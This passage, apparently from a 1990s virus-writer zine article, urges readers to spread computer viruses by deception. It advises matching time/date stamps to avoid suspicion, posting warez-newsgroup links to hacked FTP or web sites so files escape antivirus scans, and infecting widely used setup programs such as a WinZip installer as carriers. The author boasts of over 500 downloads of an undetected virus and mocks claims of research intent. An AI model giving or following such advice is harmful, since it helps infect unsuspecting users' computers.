  time/date stamp as the readme.txt. You may have made a successful infection 
  but your deception will fail if the infected program screams that time/date 
  stamps don't match! So with the more complex programs deception takes a bit 
  more thought. Does the deception end here? No. How will you distribute this 
  virus in a deceptive way? If you follow the normal route of distribution for 
  a new virus that is attached to a new ware then you would just post the zip 
  to alt.binaries.warez and all other warez-related newsgroups. Well, that's great 
  but Dr Solly scans most binary newsgroups and posts virus alerts and instant 
  fixes. So in one day you can be found, named and have a remover. That is the 
  worst thing that could ever happen to a new virus! So what's there to do? Well 
  either scam some warez web sites or warez traders into taking your file if it's 
  legit (but infected) or do what I do/did and post to all those USENET warez 
  related newsgroups with a LINK to some hacked out ftp or web site where the 
  file is stored!! No one bothers to follow all warez links and scan them. Shit, 
  I did this for one of my files and hid a counter on the site . it reached 553 
  before Geocities threw me off for distributing registered software. Now think 
  about that - I took a new, not named and currently unscannable virus and had 
  500+ people seek it out (and run it?). For deceptive distribution that was a 
  slam-dunk!</p>
<p>Ok now how did my INFECTION take care of itself? I chose a setup.exe!!! You 
  have to choose your carriers wisely. A setup program usually runs all over and 
  infects the program that it is setting up, in this case WinZip. Plus, WinZip 
  is an often used program which greatly increases your chances of survival and 
  any self extracting archives will be carriers or my virus!</p>
<p>Are you now convinced that my &quot;Theory of Better Distribution&quot; is 
  the way to attack your next world wide virus infection? I hope so.</p>
<p>Boot sector virii don't have to rule the world of distribution (and the Wild 
  List!) - think hard and you will figure out new and ingenious ways to make someone 
  want your virus. I hope that I have made you think a bit harder about what you're 
  going to do the next time that you decide to distribute one of your virii. Hopefully 
  you will never again just upload some &quot;new patch&quot; for some obscure 
  program to a local BBS and pray that your virus makes it around the world. If 
  this was 1989 then you may have had a chance but remember that you have to think 
  about now. Also, don't think you can just upload sex.exe to alt.binaries.erotica. 
  Few people are stupid enough for run an .exe from a porn newsgroups (though 
  I believe some are - just not enough of them to count).</p>
<p>Once again remember you have to think about now, don't take into account how 
  they used to do it! Think about how you can do it now! How do you get files 
  now? What programs do you want now? What makes you suspicious now?</p>
<p>Remember unless you still want to live that &quot;I just write virii for research&quot; 
  lie then you need to think as hard about your distribution as you did on making 
  your multipartite encrypted armored polymorphic stealth tunneling memory resident 
  Windows 95 virus!!!</p>
<p>Peace,<br>

<p>Ps. I also recommend you get the Nowhere Utilities by Nowhere Man! Fucing<br>
  great tools for deception!</p>
